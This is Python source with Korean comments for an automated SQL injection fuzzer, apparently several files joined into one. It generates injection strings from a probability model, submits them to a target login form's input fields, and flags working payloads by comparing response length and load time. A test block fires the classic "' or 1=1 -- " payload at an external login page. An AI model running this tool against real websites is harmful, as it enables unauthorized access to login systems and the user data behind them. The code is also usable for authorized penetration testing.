import numpy as np
import uuid
import logging
import requests
import json
import sys
from datetime import date
from treelib import Tree, Node
from bs4 import BeautifulSoup
from arg_parse import *

tree_list = []
all_strings = []

#기본값
url = "http://127.0.0.1/login/"
total_base_strings = 10
max_tries = 7
file = "odds.json"
debug_mode = False

sql_logger = logging.getLogger("SQL_Generator")

MAX_RECURSION = 5
MAX_REPS = 10
opening_chars = ["\'", "\"", ")", "1"]
comment_chars = ["#", "--", "'vRxe'='vRxe"]
string_trees = []

fuzzer_logger = logging.getLogger("Fuzzer")

stats = None

test_logger = logging.getLogger("Tester")

CHECK_LOADTIME_NUM = 10
time_to_load = 0.0

# 로그 메시지 비활성화
logging.getLogger("urllib3").setLevel(logging.WARNING)
    
def init_args():
    """
    인자 초기화
    """
    global url, total_base_strings, max_tries, file, debug_mode
    arg_parse_result = arg_parse()
    if arg_parse_result.url:
        url = arg_parse_result.url
    if arg_parse_result.file:
        file = arg_parse_result.file
    if arg_parse_result.total_base_strings:
        total_base_strings = arg_parse_result.total_base_strings
    if arg_parse_result.max_tries:
        max_tries = arg_parse_result.max_tries
    if arg_parse_result.debug_mode:
        debug_mode = arg_parse_result.debug_mode
    init_stats(file)

def change_report_in_string(s, info):
    """
    txt_results 함수의 부가 기능
    보고서 정보를 더 쉽게 변경할 수 있게 해준다.
    """
    num_len = len(str(info))
    find_index = s.find("0")

    s = s[:find_index] + str(info) + s[find_index + num_len:]
    return s

def txt_results():
    date_today = date.today().strftime("%m_%d_%y")
    filename = "{}_report_s{}_e{}.txt".format(date_today, len(successful_list), len(error_list))
    s = ""
    # 수정 보고서 업로드
    with open("report_base.txt") as f:
        lines = f.readlines()
    for l in lines[:5]:
        s += l
    # 최종 보고서
    total_tries = len(garbage) + len(error_list) + len(successful_list)
    s += change_report_in_string(lines[5], total_tries)
    s += change_report_in_string(lines[6], len(successful_list))
    s += change_report_in_string(lines[7], len(error_list))

    for l in lines[8:11]:
        s += l

    s += change_report_in_string(lines[11], total_base_strings)
    s += change_report_in_string(lines[12], max_tries)

    for l in lines[13:16]:
        s += l
    s += change_report_in_string(lines[16], filename)

    for l in lines[17:18]:
        s += l

    with open(filename, "w") as f:
        f.write(s)

        f.write("\nSuccessful Strings\n------------------\n")
        for id, tried_string in successful_list:
            f.write(tried_string + "\n")

        f.write("\nError Strings\n-------------\n")
        for id, tried_string in error_list:
            f.write(tried_string + "\n")

        f.write("\nNone Effective Strings\n----------------------\n")
        for id, tried_string in garbage:
            f.write(tried_string + "\n")

    return s


def sql_fuzz():
    logging.basicConfig(filename="" if debug_mode else "logs/fuzzer.log", level=logging.DEBUG)
    fuzzer_logger.debug("URL: {}, Max base strings: {},"\
    "Max tries per string: {}, Odds file: {}, "\
    "Debug: {}".format(url, total_base_strings, max_tries, file, debug_mode))

    """
    퍼징
    문자열을 만들어서 시동한다.
    보고서에 print하고 각 문자열을 반환시킨다.
    """
    global garbage, error_list, successful_list
    s_list = [] # 기본 문자열 저장
    garbage = [] # 작동하지 않는 문자열 저장
    abnormal = [] # 비정상적으로 동작하는 문자열 저장
    error_list = [] # 에러 리스트
    successful_list = [] # 성공 리스트

    # 기본 문자열 만들기
    print("Making the base strings")
    for i in range(total_base_strings):
        id, s = create_string()
        fuzzer_logger.info(" Base string: {}, id: {}".format(s, id))
        s_list.append((id, s))

    print("Checking strings...")
    # 기본 문자열 테스트
    for id, s in s_list:
        check = payload_check(url, s)
        fuzzer_logger.info(" Checked: {}, Result: {}".format(s, check))
        if check != "normal":
            abnormal.append((id, s))
    # 기본 문자열에서 비정상적인 문자열 제거
    s_list = [(id,s) for id, s in s_list if (id,s) not in abnormal]


    print("First results:\n  Tried strings: {}\n"\
    "  Abnormal Strings: {}".format(str(len(abnormal) + len(s_list)), len(abnormal)))

    print("Trying to upgrade the \"normal\" strings")
    # 다른 문자열을 얻기 위해 기본 문자열에 명령을 실행
    if debug_mode:
        fuzzer_logger.info(" Upgrading \"normal\" strings")
    for id, s in s_list:
        tries = 0
        fuzzer_logger.info(" Upgrading \"normal\" string: {}".format(s))
        while tries < max_tries:
            tries += 1
            garbage.append((id,s))
            id, s = upgrade(id)
            check = payload_check(url, s)
            fuzzer_logger.info("   Checked: {}, Result: {}".format(s, check))
            if check != "normal":
                abnormal.append((id,s))
                break

    print("Adding another command to abnormal strings")
    # 비정상적으로 동작하는 문자열을 개선
    if debug_mode:
        fuzzer_logger.info(" Checking abnormal strings")
    for id, s in abnormal:
        id, s = upgrade(id)
        check = payload_check(url, s)
        fuzzer_logger.info(" Checked: {}, Result: {}".format(s, check))
        if check == "normal":
            # 비정상적으로 동작하는 문자열 작동 중지
            garbage.append((id, s))
            continue
        if check == "error":
            # 특정 에러 에러리스트에 저장
            error_list.append((id, s))
        if check == "success":
            # 성공한 문자열 저장
            successful_list.append((id, s))

    error_list += abnormal
    print("Now checking all the strings that made errors")
    # 오류 문자열 제작
    fuzzer_logger.info(" Adding finishing touches(comments) to error strings")
    for id, s in error_list:
        tries = 0
        while tries < max_tries:
            tries += 1
            garbage.append((id, s))
            id, s = finishing_touches(id)
            check = payload_check(url, s)
            fuzzer_logger.info(" Checked: {}, Result: {}".format(s, check))
            if check == "error":
                continue # 계속 작동
            if check == "normal":
                garbage.append((id, s)) # 손상된 오류 문자열 garbage에 업로드
                break
            if check == "success":
                successful_list.append((id, s)) # 성공한 문자열 업로드
                break

    print(txt_results())
    return successful_list


def init_stats(filename):
    #sql_generator 모듈의 통계를 초기화합니다.
    global stats

    stats = init_stat(filename)

def is_duplicated(s):
    # 인자끝에 3개 이상의 동일한 문자가 있는지 확인하여 True 또는 False를 반환시킨다.
    if len(s) < 2:
        return False
    return s[-1] == s[-2]

def create_string(call_time=0):
    # 문자열을 만들고 ID와 그 문자열을 반환시킨다.
    id = uuid.uuid4()
    s = np.random.choice(opening_chars)
    # 자동화
    current_char = s
    while current_char in opening_chars:
        rand_s = np.random.choice(stats[current_char][0], replace=True, p=stats[current_char][1])
        if rand_s not in opening_chars:
            if is_created(s) and call_time < MAX_RECURSION: # Avoid duplicates
                sql_logger.debug(" String already exist. Recursion Num: {}".format(call_time+1))
                return create_string(call_time+1)
            string_trees.append(new_string_tree(s, id))
            new_id = uuid.uuid4()
            s += " " + rand_s
            add_son(id, s, new_id)
            return new_id, s
        if not is_duplicated(s):
            s += rand_s

def upgrade(id, call_time=0):
    #String에 새로운 주석을 추가 시킨다.
    #String의 특정한 id를 가져와서 String과  더불어 새로운 id를 반환시킨다. String이 주석으로 끝날 경우 그대로 String을 반환시킨다.
    new_id = uuid.uuid4()
    s = get_value(id)
    current_char = s.split()[-1]
    if current_char in comment_chars:
        return id, s

    rand_s = np.random.choice(stats[current_char][0], replace=True, p=stats[current_char][1])
    # 완성된 문자열은 걸러낸다.
    count = 0
    while rand_s in comment_chars:
        count += 1
        if count > MAX_REPS:
            s += " " + rand_s
            if is_created(s) and call_time < MAX_RECURSION: # Avoid duplicates
                sql_logger.debug(" String already exist. Recursion Num: {}".format(call_time+1))
                return upgrade(id, call_time+1)
            add_son(id, s, new_id)
            return new_id, s
        rand_s = np.random.choice(stats[current_char][0], replace=True, p=stats[current_char][1])

    s += " " + rand_s
    if is_created(s) and call_time < MAX_RECURSION: # Avoid duplicates
        sql_logger.debug(" String already exist. Recursion Num: {}".format(call_time+1))
        return upgrade(id, call_time+1)

    add_son(id, s, new_id)
    return new_id, s

def finishing_touches(id):
    #String의 ID를 얻고 문자열에 주석을 추가합니다.
    #이 함수는 새 문자열과 새 ID를 반환합니다.
    #주석을 추가할 수 없는 경우 함수는 명령을 추가하고 반환합니다.
    new_id = uuid.uuid4()
    s = get_value(id)
    current_char = s.split()[-1]
    if current_char in comment_chars:
        return id, s

    rand_s = np.random.choice(stats[current_char][0], replace=True, p=stats[current_char][1])

    count = 0
    while rand_s not in comment_chars:
        count += 1
        if count > MAX_REPS:
            s += " " + rand_s
            add_son(id, s, new_id)
            return new_id, s
        rand_s = np.random.choice(stats[current_char][0], replace=True, p=stats[current_char][1])

    s += " " + rand_s
    add_son(id, s, new_id)
    return new_id, s

'''
if __name__ == '__main__':
    print(stats)
'''

#tester

def get_input_fields(URL):
    # URL을 가져오고 그 URL에 있는 모든 입력 태그의 ID와 이름을 반환 
    # :매개변수: URL - 정보를 가져올 URL
    # html 페이지에 요청
    r = requests.get(URL)
    soup = BeautifulSoup(r.text, 'html.parser')

    # 모든 input 태그 확인
    fields = []
    for inpt in soup.find_all("input"):
    # 일부 사이트는 ID 대신 태그 이름을 사용하여 데이터 수신
        if "id" in inpt.attrs:
            fields.append(inpt["id"])
        elif "name" in inpt.attrs:
            fields.append(inpt["name"])
        elif "uid" in inpt.attrs:
            fields.append(inpt["uid"])
        elif "uname" in inpt.attrs:
            fields.append(inpt["uname"])
        elif inpt.attrs["type"].lower() == "submit":
            pass
        else:
            print("Can't handle this input tag:\n" + str(inpt))
        test_logger.debug(" Input Fields: {}".format(fields))
    return fields

def check_method(html):
    #지정된 html의 전송 방법이 POST인지 GET인지 확인
    soup = BeautifulSoup(html, 'html.parser')

    form_tag = soup.find_all("form")
    form_tag = form_tag[0]

    test_logger.debug(" Sending Method: {}".format(form_tag["method"]))
	# URL로 응답 보내기
    if "method" in form_tag.attrs and form_tag["method"].lower() == "post":
        return "post"
    elif "method" in form_tag.attrs and form_tag["method"].lower() == "get":
        return "get"
    else:
        return form_tag["method"].lower()

def check_loadtime(URL):
	global time_to_load
	if time_to_load != 0.0:
		return time_to_load

	time_avg = 0.0
	for x in range(CHECK_LOADTIME_NUM):
		item, tmp = get_info(URL)
		time_avg += item
	time_to_load = time_avg / CHECK_LOADTIME_NUM
	return time_to_load

def get_info(URL, s="abudy"):
    """
    지정된 문자열을 매개 변수로 사용하여 URL에 요청 수신
    응답 도착 시간과 다음 행 길이를 반환
    html
    :매개변수: URL - 데이터를 보낼 URL
    :매개변수: s - html을 확인할 문자열. 비어 있으면 임의 값이 사용
    """
    # 보낼 input 준비
    inputs = get_input_fields(URL)
    data = {}

    for inpt in inputs:
        data[inpt] = s

    # URL로 응답 보내기
    r = requests.get(URL)
    method = check_method(r.text)
    if method == "post":
        r = requests.post(URL, data=data)
    elif method == "get":
        r = requests.get(URL, data=data)
    else:
        print("Unknown method", method)
        return 0
    return r.elapsed.total_seconds(), len(r.text.split("\n"))


def payload_check(URL, payload):
	"""
        payload 확인
        url과 문자열을 지정하면 해당 문자열이 사이트에 영향을 미치는지 여부를 확인한다.
        반환값:
        오류 - 문자열이 오류를 발생시키고 있음을 경고
        성공 - 문자열이 작동 중임을 경고
        정상 - 사이트에 특별한 영향이 없음을 경고
    """

	normal_time, normal_length = get_info(URL)
	suspicious_time, suspicious_length = get_info(URL, payload)

	loadtime = check_loadtime(URL)
	test_logger.info(" Normal Time: {}, Normal Length: {}".format(normal_time, normal_length))
	test_logger.info(" Suspicious Time: {}, Suspicious Length: {}".format(suspicious_time, suspicious_length))

	if normal_length != suspicious_length:
		return "error"

	if suspicious_time > 2 * time_to_load:
		return "success"

	return "normal"


if __name__ == '__main__':
	URL = "http://s130993-101229-fax.croto.hack.me/login.php"
	payload = "\' or 1=1 -- "
	print(payload_check(URL, payload))

def init_stat(filename):
    """
        json 파일에서 통계를 불러오고 사용 가능한 다음 문자 목록과 그 확률에 대한 두 번째 목록을 포함하는 사전 반환
    """ 

    with open(filename) as json_file:
        data = json.load(json_file)

    statistics = {}
    for chr, stats2 in data.items():
        statistics[chr] = (list(stats2.keys()), list(stats2.values()))

    return statistics


def new_string_tree(s, id):
    """ 
        첫 문자열을 넣을 트리 생성 후 반환
    """
    new_tree = Tree()
    new_tree.create_node(s, id)

    tree_list.append(new_tree)
    all_strings.append(s)
    return new_tree


def add_son(father_id, son_string, son_id):
    """
        father_id를 사용하여 특정 노드에 자식 노드를 추가한다.
        father_id를 포함하고 있다면 노드를 생성하고 True를 반환하고 아니면 False를 반환한다.
    """
    for tree in tree_list:
        if tree.contains(father_id):
            tree.create_node(son_string, son_id, parent=father_id)
            all_strings.append(son_string)
            return True

    return False


def is_created(s):
    """
        반복되는 문자열이 없는지 확인
    """
    return s in all_strings


def get_value(id):
    """
        ID를 가져와 트리에 저장된 데이터 반환 
        ID가 없으면 False 반환
    """
    for tree in tree_list:
        if tree.contains(id):
            return tree[id].tag

    return "False"
'''
if __name__ == '__main__':
    print(init_stats("odds.json"))
'''

#sharpener.py

FILENAME = "sql_bank.txt"
JSON_NAME = "odds.json"

with open(FILENAME) as f:
	lines = f.readlines()

unique_char = set()

for line in lines:
	for word in line.split():
		if word == "\n":
			continue
		unique_char.add(word)

next_char = {}

for chr in unique_char:
	next_char[chr] = []

for line in lines:
	line = line.split()
	for i in range(len(line)-1):
		if line[i] == "\n" or line[i+1] == "\n":
			break
		next_char[line[i]].append(line[i+1])

stats_char = {}

for key, value in next_char.items():
	# print(value)
	total_chars = len(value)
	stats_char[key] = {}
	for chr in set(value):
		char_count = value.count(chr)
		stat = float(char_count / total_chars)
		stats_char[key][chr] = stat

json_string = json.dumps(stats_char, indent=4)
with open(JSON_NAME, "w") as f:
	f.write(json_string)